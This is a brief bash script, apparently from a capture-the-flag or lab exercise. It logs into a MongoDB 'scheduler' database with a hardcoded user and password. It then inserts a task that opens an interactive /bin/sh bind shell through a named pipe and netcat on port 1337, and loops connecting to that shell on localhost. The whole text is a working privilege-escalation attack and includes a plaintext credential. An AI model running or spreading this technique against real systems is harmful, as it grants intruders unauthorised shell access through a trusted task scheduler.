#!/bin/bash
mongo -u mark -p 5AYRft73VtFpc84k scheduler --eval 'db.tasks.insert({"cmd": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f"})'>/dev/null;
while true; do nc localhost 1337; done

